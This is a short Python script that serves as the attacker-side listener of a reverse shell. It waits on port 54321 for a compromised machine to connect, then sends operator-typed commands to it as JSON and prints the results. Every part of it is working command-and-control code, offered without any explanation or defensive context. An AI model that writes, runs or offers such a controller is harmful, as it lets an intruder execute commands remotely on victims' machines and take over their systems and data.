#!/usr/bin/python3
import socket
from termcolor import colored
import json

addr = None
HOST = ''
PORT = 54321


def reliable_send(_target, _cmd):
	json_data = json.dumps(_cmd)
	_target.sendall(json_data.encode('UTF-8'))


def reliable_recv(_target):
	data = ""
	while True:
		try:
			data = data + (_target.recv(1024)).decode('UTF-8')
			return json.loads(data)
		except ValueError:
			continue


def shell(_s, _target, _addr):
	while True:
		cmd = input('* Shell#~%s: ' % str(_addr))
		reliable_send(_target, cmd)
		if cmd == 'q':
			print(colored('[-] You decided to exit', 'red'))
			_target.close()
			_s.close()
			break
		else:
			result = reliable_recv(_target)
			print('Received Message: ', result)


def server():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((HOST, PORT))
		s.listen(5) # how many connections - 5
		print(colored('[+] Listening for Incoming Connections', 'green'))
		target, addr = s.accept()
		print(colored('[+] Connection Established From: %s' % str(addr), 'green'))
		with target:
			shell(s, target, addr)


server()
